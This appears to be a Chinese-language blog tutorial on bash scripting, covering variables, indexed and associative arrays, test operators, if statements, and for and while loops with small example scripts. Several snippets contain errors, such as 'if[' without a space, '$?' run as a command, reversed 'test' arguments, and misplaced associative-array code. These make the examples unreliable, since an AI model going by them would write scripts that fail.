<h3 id="3-定义变量"><a href="#3-定义变量" class="headerlink" title="3.定义变量"></a>3.定义变量</h3><h4 id="3-1定义变量"><a href="#3-1定义变量" class="headerlink" title="3.1定义变量"></a>3.1定义变量</h4><p>变量格式：<code>变量名=值</code></p>
<p><strong>在shell编程中的变量名和等号之间不能有空格</strong></p>
<p>变量命名规则：</p>
<ol>
<li>命名只能使用英文字母，数字和下划线，首个字符不能以数字开头。</li>
<li>中间不能有空格，可以使用下划线（_）。</li>
<li>不能使用标点符号。</li>
<li>不能使用bash里的关键字（可用help命令查看保留关键字）。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">VAR1=1</span><br><span class="line"></span><br><span class="line">age=18</span><br><span class="line"></span><br><span class="line">name=&#x27;baism&#x27;</span><br><span class="line"></span><br><span class="line">score=88.8</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：字符串要用单引号或双引号引起来</p>
<h4 id="3-2读取变量内容"><a href="#3-2读取变量内容" class="headerlink" title="3.2读取变量内容"></a>3.2读取变量内容</h4><p>读取变量内容符:<code>$</code></p>
<p>读取方法：<code>$变量名</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $name</span><br><span class="line">echo $school</span><br><span class="line">echo $age</span><br><span class="line">echo $score</span><br></pre></td></tr></table></figure>
<h4 id="3-3取消变量unset"><a href="#3-3取消变量unset" class="headerlink" title="3.3取消变量unset"></a>3.3取消变量unset</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unset name</span><br><span class="line">echo $name</span><br></pre></td></tr></table></figure>
<h4 id="3-4定义全局变量export"><a href="#3-4定义全局变量export" class="headerlink" title="3.4定义全局变量export"></a>3.4定义全局变量export</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export name=&#x27;Tom&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ol>
<li><p>上述设置的变量其实都是一次性变量，系统重启就会丢失。</p>
</li>
<li><p>如果希望本地变量或者全局变量可以永久使用，可以将需要设置的变量写入变量文件中即可。</p>
</li>
</ol>
<h4 id="3-5定义永久变量"><a href="#3-5定义永久变量" class="headerlink" title="3.5定义永久变量"></a>3.5定义永久变量</h4><p>本地变量：用户私有变量，只有本用户可以使用，保存在家目录下的.bash_profile、.bashrc文件中</p>
<p>全局变量：所有用户都可以使用，保存在/etc/profile、/etc/bashrc文件中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">本地变量</span></span><br><span class="line">tail -1 ~/.bash_profile</span><br><span class="line">name=&#x27;baism&#x27;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">全局变量</span></span><br><span class="line">tail -1 /etc/profile</span><br><span class="line">export age=30</span><br></pre></td></tr></table></figure>


<h2 id="六、shell数组"><a href="#六、shell数组" class="headerlink" title="六、shell数组"></a>六、shell数组</h2><ul>
<li>数组介绍</li>
<li>基本数组</li>
<li>关联数组</li>
<li>案列分享</li>
</ul>
<hr>
<h3 id="1-数组介绍"><a href="#1-数组介绍" class="headerlink" title="1.数组介绍"></a>1.数组介绍</h3><p>一个变量只能存一个值，但是现实中又又很多值需要存储，那么变量就有些拘谨了。比如做一个学员信息表，一个班50个人，每个人6条信息，我们需要定义300个变量才能完成。恐怖恐怖，这只是一个班的学生，一个学校呢？一个市呢？……我想静静了！</p>
<p>仔细想想上述的案例，一个学生六个信息:ID、姓名、性别、年龄、成绩、班级。可不可以定义六个变量就能存储这六类信息呢？答案是当然可以的！变量不行，我们就用数组。</p>
<h3 id="2-基本数组"><a href="#2-基本数组" class="headerlink" title="2.基本数组"></a>2.基本数组</h3><p>数组可以让用户一次赋予多个值，需要读取数据时只需通过索引调用就可以方便读出了。</p>
<h4 id="2-1数组语法"><a href="#2-1数组语法" class="headerlink" title="2.1数组语法"></a>2.1数组语法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">数组名称=(元素1 元素2 元素3 ...)</span><br></pre></td></tr></table></figure>
<h4 id="2-2数组读出"><a href="#2-2数组读出" class="headerlink" title="2.2数组读出"></a>2.2数组读出</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;数组名称[索引]&#125;</span></span><br></pre></td></tr></table></figure>
<p>索引默认是元素在数组中的排队编号，默认第一个从0开始</p>
<h4 id="2-3数组赋值"><a href="#2-3数组赋值" class="headerlink" title="2.3数组赋值"></a>2.3数组赋值</h4><p><strong>方法一：一次赋一个值</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">array0[0]=&#x27;tom&#x27;</span><br><span class="line">array0[1]=&#x27;jarry&#x27;</span><br><span class="line">array0[2]=&#x27;natasha&#x27;</span><br></pre></td></tr></table></figure>
<p><strong>方法二： 一次赋多个值</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">array2=(tom jack alice)</span><br><span class="line">array3=(cat /etc/passwd) 	#希望是将该文件中的每一个行作为一个元素赋值给数组array3</span><br><span class="line">array4=(ls /var/ftp/Shell/for*)</span><br><span class="line">array5=(tom jack alice “bash shell”)</span><br></pre></td></tr></table></figure>
<h4 id="2-4查看数组"><a href="#2-4查看数组" class="headerlink" title="2.4查看数组"></a>2.4查看数组</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">declare -a</span><br><span class="line">declare -a array1=&#x27;([0]=”pear” [1]=”apple” [2]=”orange” [3]=”peach”)&#x27;</span><br><span class="line">declare -a array2=&#x27;([0]=”tom” [1]=”jack” [2]=”alice”)&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="2-5访问数组元素"><a href="#2-5访问数组元素" class="headerlink" title="2.5访问数组元素"></a>2.5访问数组元素</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $&#123;array1[0]&#125; 		#访问数组中的第一个元素</span><br><span class="line">echo $&#123;array1[@]&#125; 		#访问数组中所有元素 等同于 echo $&#123;array1[*]&#125;</span><br><span class="line">echo $&#123;#array1[@]&#125; 		#统计数组元素的个数</span><br><span class="line">echo $&#123;!array2[@]&#125; 		#获取数组元素的索引</span><br><span class="line">echo $&#123;array1[@]:1&#125; 	#从数组下标1开始</span><br><span class="line">echo $&#123;array1[@]:1:2&#125; 	#从数组下标1开始，访问两个元素</span><br></pre></td></tr></table></figure>
<h4 id="2-6遍历数组"><a href="#2-6遍历数组" class="headerlink" title="2.6遍历数组"></a>2.6遍历数组</h4><p>默认数组通过数组元素的个数进行遍历</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $&#123;ass_array2[index1]&#125;</span><br><span class="line">echo $&#123;ass_array2[index2]&#125;</span><br><span class="line">echo $&#123;ass_array2[index3]&#125;</span><br><span class="line">echo $&#123;ass_array2[index4]&#125;</span><br></pre></td></tr></table></figure>
<p>方法二： 针对关联数组可以通过数组元素的索引进行遍历</p>
<h3 id="3-关联数组"><a href="#3-关联数组" class="headerlink" title="3.关联数组"></a>3.关联数组</h3><p>关联数组可以允许用户自定义数组的索引，这样使用起来更加方便、高效。</p>
<h4 id="3-1定义关联数组"><a href="#3-1定义关联数组" class="headerlink" title="3.1定义关联数组"></a>3.1定义关联数组</h4><p>申明关联数组变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">declare -A ass_array1</span><br><span class="line">declare -A ass_array2</span><br></pre></td></tr></table></figure>
<h4 id="3-2关联数组赋值"><a href="#3-2关联数组赋值" class="headerlink" title="3.2关联数组赋值"></a>3.2关联数组赋值</h4><p><strong>方法一： 一次赋一个值</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">数组名[索引]=变量值</span><br><span class="line">ass_array1[index1]=pear</span><br><span class="line">ass_array1[index2]=apple</span><br><span class="line">ass_array1[index3]=orange</span><br><span class="line">ass_array1[index4]=peach</span><br></pre></td></tr></table></figure>
<p><strong>方法二： 一次赋多个值</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ass_array2=([index1]=tom [index2]=jack [index3]=alice [index4]=’bash shell’)</span><br></pre></td></tr></table></figure>
<h4 id="3-3查看数组"><a href="#3-3查看数组" class="headerlink" title="3.3查看数组"></a>3.3查看数组</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">declare -A</span><br><span class="line">declare -A ass_array1=’([index4]=”peach” [index1]=”pear” [index2]=”apple” [index3]=”orange” )’</span><br><span class="line">declare -A ass_array2=’([index4]=”bash shell” [index1]=”tom” [index2]=”jack” [index3]=”alice” )’</span><br></pre></td></tr></table></figure>
<h4 id="3-4访问数组元素"><a href="#3-4访问数组元素" class="headerlink" title="3.4访问数组元素"></a>3.4访问数组元素</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $&#123;ass_array2[index2]&#125; 		#访问数组中的第二个元数</span><br><span class="line">echo $&#123;ass_array2[@]&#125; 			#访问数组中所有元数 等同于 echo $&#123;array1[*]&#125;</span><br><span class="line">echo $&#123;#ass_array2[@]&#125; 			#获得数组元数的个数</span><br><span class="line">echo $&#123;!ass_array2[@]&#125; 			#获得数组元数的索引</span><br></pre></td></tr></table></figure>
<h4 id="3-5遍历数组"><a href="#3-5遍历数组" class="headerlink" title="3.5遍历数组"></a>3.5遍历数组</h4><p>通过数组元数的索引进行遍历,针对关联数组可以通过数组元素的索引进行遍历</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $&#123;ass_array2[index1]&#125;</span><br><span class="line">echo $&#123;ass_array2[index2]&#125;</span><br><span class="line">echo $&#123;ass_array2[index3]&#125;</span><br><span class="line">echo $&#123;ass_array2[index4]&#125;</span><br></pre></td></tr></table></figure>


<h3 id="4-案例分享——学员信息系统"><a href="#4-案例分享——学员信息系统" class="headerlink" title="4.案例分享——学员信息系统"></a>4.案例分享——学员信息系统</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for ((i=0;i&lt;3;i++))</span><br><span class="line">   do</span><br><span class="line">      read -p &quot;输入第$((i + 1))个人名: &quot; name[$i]</span><br><span class="line">      read -p &quot;输入第$[$i + 1]个年龄: &quot; age[$i]</span><br><span class="line">      read -p &quot;输入第`expr $i + 1`个性别: &quot; gender[$i]</span><br><span class="line">done</span><br><span class="line">clear</span><br><span class="line">      echo -e &quot;\t\t\t\t学员查询系统&quot;</span><br><span class="line">while :</span><br><span class="line">   do</span><br><span class="line">      cp=0</span><br><span class="line"><span class="meta">#</span><span class="bash">      <span class="built_in">echo</span> -e <span class="string">&quot;\t\t\t\t学员查询系统&quot;</span></span></span><br><span class="line">      read -p &quot;输入要查询的姓名: &quot; xm</span><br><span class="line">      [ $xm == &quot;Q&quot; ]&amp;&amp;exit</span><br><span class="line">      for ((i=0;i&lt;3;i++))</span><br><span class="line">         do</span><br><span class="line">              if [ &quot;$xm&quot; == &quot;$&#123;name[$i]&#125;&quot; ];then</span><br><span class="line">                  echo &quot;$&#123;name[$i]&#125; $&#123;age[$i]&#125; $&#123;gender[$i]&#125;&quot;</span><br><span class="line">                  cp=1</span><br><span class="line">              fi</span><br><span class="line">      done</span><br><span class="line">      [ $cp -eq 0 ]&amp;&amp;echo &quot;not found student&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>


<h2 id="七、shell流程控制-if判断语句"><a href="#七、shell流程控制-if判断语句" class="headerlink" title="七、shell流程控制-if判断语句"></a>七、shell流程控制-if判断语句</h2><ul>
<li>shell中的五大运算</li>
<li>if语法</li>
</ul>
<hr>
<p>当我们在写程序的时候，时常对上一步执行是否成功如何判断苦恼，当我们今天学习了if就可以解决你的苦恼。if语句在我们程序中就是用来做判断的，以后大家不管学习什么语言，以后只要涉及到判断的部分，大家就可以直接拿if来使用，不同的语言之间的if只是语法不同，原理是相同的。</p>
<h3 id="1-shell中的运算"><a href="#1-shell中的运算" class="headerlink" title="1. shell中的运算"></a>1. shell中的运算</h3><h4 id="1-1数学比较运算"><a href="#1-1数学比较运算" class="headerlink" title="1.1数学比较运算"></a>1.1数学比较运算</h4><p>运算符解释：</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-eq</td>
<td>等于</td>
</tr>
<tr>
<td align="center">-gt</td>
<td>大于</td>
</tr>
<tr>
<td align="center">-lt</td>
<td>小于</td>
</tr>
<tr>
<td align="center">-ge</td>
<td>大于或等于</td>
</tr>
<tr>
<td align="center">-le</td>
<td>小于或等于</td>
</tr>
<tr>
<td align="center">-ne</td>
<td>不等于</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test 1 -eq 1;$?		#0（shell中0为真，1为假）</span><br><span class="line">test 1 -lt 1;$?		#1	</span><br></pre></td></tr></table></figure>
<h4 id="1-2字符串比较运算"><a href="#1-2字符串比较运算" class="headerlink" title="1.2字符串比较运算"></a>1.2字符串比较运算</h4><p>运算符解释，注意字符串一定别忘了使用引号引起来</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">==</td>
<td>等于</td>
</tr>
<tr>
<td align="center">!=</td>
<td>不等于</td>
</tr>
<tr>
<td align="center">-n</td>
<td>检查字符串的长度是否大于0</td>
</tr>
<tr>
<td align="center">-z</td>
<td>检查字符串的长度是否为0</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test &#x27;abc&#x27; -n</span><br></pre></td></tr></table></figure>
<h4 id="1-3文件比较与检查"><a href="#1-3文件比较与检查" class="headerlink" title="1.3文件比较与检查"></a>1.3文件比较与检查</h4><table>
<thead>
<tr>
<th align="center">运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-d</td>
<td>检查文件是否存在且为目录</td>
</tr>
<tr>
<td align="center">-e</td>
<td>检查文件是否存在</td>
</tr>
<tr>
<td align="center">-f</td>
<td>检查文件是否存在且为文件</td>
</tr>
<tr>
<td align="center">-r</td>
<td>检查文件是否存在且可读</td>
</tr>
<tr>
<td align="center">-s</td>
<td>检查文件是否存在且不为空</td>
</tr>
<tr>
<td align="center">-w</td>
<td>检查文件是否存在且可写</td>
</tr>
<tr>
<td align="center">-x</td>
<td>检查文件是否存在且可执行</td>
</tr>
<tr>
<td align="center">-O</td>
<td>检查文件是否存在并且被当前用户拥有</td>
</tr>
<tr>
<td align="center">-G</td>
<td>检查文件是否存在并且默认组为当前用户组</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file1 -nt file2  检查file1是否比file2新</span><br><span class="line">file1 -ot file2  检查file1是否比file2旧</span><br><span class="line">file1 -ef file2  检查file1是否与file2是同一个文件</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test -d /opt/shell;echo $?		#0</span><br><span class="line">test -e /opt/shell/shell_05.sh;echo $?		#0</span><br></pre></td></tr></table></figure>
<h4 id="1-4逻辑运算"><a href="#1-4逻辑运算" class="headerlink" title="1.4逻辑运算"></a>1.4逻辑运算</h4><table>
<thead>
<tr>
<th align="center">运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&amp;&amp;</td>
<td>逻辑与运算</td>
</tr>
<tr>
<td align="center">||</td>
<td>逻辑或运算</td>
</tr>
<tr>
<td align="center">！</td>
<td>逻辑非运算</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ 1 -eq 1 ] &amp;&amp; [ 2 -eq 2 ];then echo &quot;yes&quot;;else echo &quot;no&quot;;fi		#yes</span><br></pre></td></tr></table></figure>
<p><strong>逻辑运算注意事项：逻辑与 或 运算都需要两个或以上条件，逻辑非运算只能一个条件。</strong></p>
<h4 id="1-5赋值运算"><a href="#1-5赋值运算" class="headerlink" title="1.5赋值运算"></a>1.5赋值运算</h4><p>=：赋值运算符</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=10   </span><br><span class="line">name=&#x27;baism&#x27;</span><br></pre></td></tr></table></figure>


<h3 id="2-if语法"><a href="#2-if语法" class="headerlink" title="2. if语法"></a>2. if语法</h3><h4 id="2-1语法一：单if语句"><a href="#2-1语法一：单if语句" class="headerlink" title="2.1语法一：单if语句"></a>2.1语法一：单if语句</h4><p>适用范围:只需要一步判断，条件返回真干什么或者条件返回假干什么。</p>
<p>语句格式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ condition ]           #condition 值为true or false</span><br><span class="line">   then</span><br><span class="line">      commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>判断当前用户是不是root，如果不是那么返回”ERROR: need to be root so that!“</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if[ $USER != &#x27;root&#x27; ]</span><br><span class="line">	then</span><br><span class="line">		echo &quot;ERROR:need to be so that&quot;</span><br><span class="line">		exit 1</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<h4 id="2-2语法二：if-then-else语句"><a href="#2-2语法二：if-then-else语句" class="headerlink" title="2.2语法二：if-then-else语句"></a>2.2语法二：if-then-else语句</h4><p>适用范围:两步判断，条件为真干什么，条件为假干什么。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ condition ]</span><br><span class="line">     then</span><br><span class="line">          commands1</span><br><span class="line">else</span><br><span class="line">          commands2</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>判断当前登录用户是管理员还是普通用户,如果是管理员输出”hey admin“ 如果是普通用户输出”hey guest“</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ $USER == &#x27;root&#x27; ]</span><br><span class="line">	then </span><br><span class="line">		echo &quot;hey admin&quot;</span><br><span class="line">else </span><br><span class="line">		echo &quot;hey guest&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<h4 id="2-3语法三：if-then-elif语句"><a href="#2-3语法三：if-then-elif语句" class="headerlink" title="2.3语法三：if-then-elif语句"></a>2.3语法三：if-then-elif语句</h4><p>适用范围:多于两个以上的判断结果，也就是多于一个以上的判断条件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ condition 1]</span><br><span class="line">     then</span><br><span class="line">            commands1</span><br><span class="line">elif [ condition 2]</span><br><span class="line">     then</span><br><span class="line">             commands2</span><br><span class="line">  .......</span><br><span class="line">else</span><br><span class="line">            commandsX</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>通过一个脚本，判断两个整数的关系。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if [ $1 -gt $2 ]</span><br><span class="line">	then</span><br><span class="line">        echo &quot;$1 &gt; $2&quot;</span><br><span class="line">elif [ $1 -eq $2 ]</span><br><span class="line">	then</span><br><span class="line">        echo &quot;$1 = $2&quot;</span><br><span class="line">else</span><br><span class="line">        echo &quot;$1 &lt; $2&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>


<h3 id="3-if高级应用"><a href="#3-if高级应用" class="headerlink" title="3. if高级应用"></a>3. if高级应用</h3><ol>
<li>条件符号使用双圆括号，可以在条件中植入数学表达式</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if (( 100%3+1&gt;1 ));then</span><br><span class="line">	echo &quot;yes&quot;</span><br><span class="line">else</span><br><span class="line">	echo &quot;no&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p><strong>注意 双小圆括号中的比较运算符 使用的是我们传统的比较运算符 &gt;&gt;= == &lt;&lt;= !=</strong></p>
<ol start="2">
<li>使用双方括号,可以在条件中使用通配符</li>
</ol>
<p>为字符串提供高级功能，模式匹配 r* 匹配r开头的字符串</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in r1 rr2 cc rr3</span><br><span class="line">	do</span><br><span class="line">		if [[ $i == r* ]];then</span><br><span class="line">			echo $i</span><br><span class="line">		fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>为字符串提供高级功能，模式匹配 r* 匹配r开头的字符串</p>
<h2 id="八、shell流程控制-for循环语句"><a href="#八、shell流程控制-for循环语句" class="headerlink" title="八、shell流程控制-for循环语句"></a>八、shell流程控制-for循环语句</h2><ul>
<li>for循环介绍</li>
</ul>
<ul>
<li>for语法</li>
<li>循环控制</li>
</ul>
<hr>
<p>脚本在执行任务的时候，总会遇到需要循环执行的时候，比如说我们需要脚本每隔五分钟执行一次ping的操作，除了计划任务，我们还可以使用脚本来完成，那么我们就用到了循环语句。</p>
<h3 id="1-for-循环介绍"><a href="#1-for-循环介绍" class="headerlink" title="1. for 循环介绍"></a>1. for 循环介绍</h3><p>很多人把for循环叫做条件循环，或者for i in 。其实前者说的就是for的特性，for循环的次数和给予的条件是成正比的，也就是你给5个条件，那么他就循环5次；后者说的是for的语法。</p>
<p>循环的优点：</p>
<ol>
<li>节省内存（完成同一个任务）</li>
<li>结构更清晰</li>
<li>节省时间成本</li>
</ol>
<h3 id="2-for语法"><a href="#2-for语法" class="headerlink" title="2. for语法"></a>2. for语法</h3><h4 id="2-1-for-语法一"><a href="#2-1-for-语法一" class="headerlink" title="2.1 for 语法一"></a>2.1 for 语法一</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for var in value1 value2 ......</span><br><span class="line">    do</span><br><span class="line">        commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>循环输出1-9数字</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in `seq 1 9`		#seq 1 9 是从1数到9</span><br><span class="line">	do</span><br><span class="line">		echo $i</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<h4 id="2-2-for语法二"><a href="#2-2-for语法二" class="headerlink" title="2.2 for语法二"></a>2.2 for语法二</h4><p>C式的for命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for ((变量;条件;自增减运算  ))</span><br><span class="line">   do</span><br><span class="line">          代码块</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>输出1-9</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for (( i=1;i&lt;10;i++ ))</span><br><span class="line">	do</span><br><span class="line">		echo $i</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>for循环使用多个变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for (( a=0,b=9;a&lt;10;a++,b-- ))</span><br><span class="line">	do</span><br><span class="line">		echo $a,$b</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>for 无限循环 使用((;;)) 条件可以实现无线循环</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for ((;;))</span><br><span class="line">	do</span><br><span class="line">		echo &quot;hehe&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>


<h3 id="3-循环控制语句"><a href="#3-循环控制语句" class="headerlink" title="3.循环控制语句"></a>3.循环控制语句</h3><h4 id="3-1-sleep-N-脚本执行到该步休眠N秒"><a href="#3-1-sleep-N-脚本执行到该步休眠N秒" class="headerlink" title="3.1 sleep N 脚本执行到该步休眠N秒"></a>3.1 sleep N 脚本执行到该步休眠N秒</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in `seq 9 -1 0`</span><br><span class="line">	do</span><br><span class="line">		echo -n -e &quot;\b$i&quot;</span><br><span class="line">		sleep 1</span><br><span class="line">done</span><br><span class="line">echo</span><br></pre></td></tr></table></figure>
<h4 id="3-2-continue-跳过循环中的某次循环"><a href="#3-2-continue-跳过循环中的某次循环" class="headerlink" title="3.2 continue 跳过循环中的某次循环"></a>3.2 continue 跳过循环中的某次循环</h4><p>默认循环输出1-9，但是使用continue跳过输出5</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for (( i=1;i&lt;10;i++ ))</span><br><span class="line">	do</span><br><span class="line">		if [ $i -eq 5 ]</span><br><span class="line">			then</span><br><span class="line">				continue</span><br><span class="line">			else</span><br><span class="line">            	echo $i</span><br><span class="line">            fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<h4 id="3-3-break-跳出循环继续执行后续代码"><a href="#3-3-break-跳出循环继续执行后续代码" class="headerlink" title="3.3 break 跳出循环继续执行后续代码"></a>3.3 break 跳出循环继续执行后续代码</h4><p>默认循环输出1-9，当输出到5的时候跳出循环</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for (( i=1;i&lt;10;i++ ))</span><br><span class="line">	do</span><br><span class="line">		echo $i</span><br><span class="line">		if [ $i -eq 5 ]</span><br><span class="line">			then</span><br><span class="line">				break</span><br><span class="line">            fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<h4 id="3-4实例"><a href="#3-4实例" class="headerlink" title="3.4实例"></a>3.4实例</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">监控主机存活的脚本</span></span><br><span class="line">for ((;;))</span><br><span class="line">	do</span><br><span class="line">		ping -c1 $1 &amp;&gt;/dev/null		#-c1是是发送一个请求包，并将返回数据放进回收站</span><br><span class="line">		if [ $? -eq 0 ]</span><br><span class="line">			then </span><br><span class="line">				echo &quot;`date +&quot;%F %H:%M:%S&quot;`: $1 is UP&quot;</span><br><span class="line">			else </span><br><span class="line">				echo &quot;`date +&quot;%F %H:%M:%S&quot;`: $1 is DOWN&quot;</span><br><span class="line">			fi</span><br><span class="line"><span class="meta">		#</span><span class="bash">脚本节奏控制 生产环境下建议1分钟及以上</span></span><br><span class="line">		sleep 3</span><br><span class="line">done</span><br></pre></td></tr></table></figure>


<h2 id="九、shell流程控制-while循环语句"><a href="#九、shell流程控制-while循环语句" class="headerlink" title="九、shell流程控制-while循环语句"></a>九、shell流程控制-while循环语句</h2><ul>
<li>while循环介绍</li>
<li>while循环语法</li>
<li>while实战</li>
</ul>
<hr>
<h3 id="1-while循环介绍"><a href="#1-while循环介绍" class="headerlink" title="1. while循环介绍"></a>1. while循环介绍</h3><p>while在shell中也是负责循环的语句，和for一样。因为功能一样，很多人在学习和工作中的脚本遇到循环到底该使用for还是while呢？很多人不知道，就造就了有人一遇到循环就是for或者一位的while。我个人认为可以按照我说的这个思想来使用，既知道循环次数就可以用for，比如说一天需要循环24次；如果不知道代码要循环多少次，那就用while，比如我们作业中要求写的猜数字，每个人猜对一个数字的次数都是不能固定的，也是未知的。所以这样的循环我就建议大家用while了。</p>
<h3 id="2-while循环语法"><a href="#2-while循环语法" class="headerlink" title="2.while循环语法"></a>2.while循环语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">while  [ condition ]      #注意，条件为真while才会循环，条件为假，while停止循环</span><br><span class="line"> do</span><br><span class="line">             commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>丈母娘选女婿条件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">read -p &quot;money:&quot; money</span><br><span class="line">read -p &quot;car:&quot; car</span><br><span class="line">read -p &quot;house:&quot; house</span><br><span class="line">while [ $money -lt 100000 ] || [ $car -lt 1 ] || [ $house -lt 1 ]</span><br><span class="line">	do</span><br><span class="line">		echo &quot;不行&quot;</span><br><span class="line">		read -p &quot;money:&quot; money</span><br><span class="line">		read -p &quot;car:&quot; car</span><br><span class="line">		read -p &quot;house:&quot; house</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo &quot;给你了&quot;</span><br></pre></td></tr></table></figure>


<h3 id="3-while实战"><a href="#3-while实战" class="headerlink" title="3. while实战"></a>3. while实战</h3><ol>
<li>使用while 遍历文件内容</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">使用<span class="keyword">while</span>遍历文件内容</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while read i</span><br><span class="line">	do</span><br><span class="line">		echo &quot;$i&quot;</span><br><span class="line">done &lt; $1</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>使用while读出文件中的列，IFS指定默认的列分隔符</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">使用<span class="keyword">while</span>读出文件中的列，IFS指定默认的列分隔符</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">IFS=$&quot;:&quot;</span><br><span class="line">while read f1 f2 f3 f4 f5 f6 f7</span><br><span class="line">	do</span><br><span class="line">		echo &quot;$f1 $f2 $f3&quot;</span><br><span class="line">done &lt; /etc/passwd		</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>九九乘法表</li>
</ol>
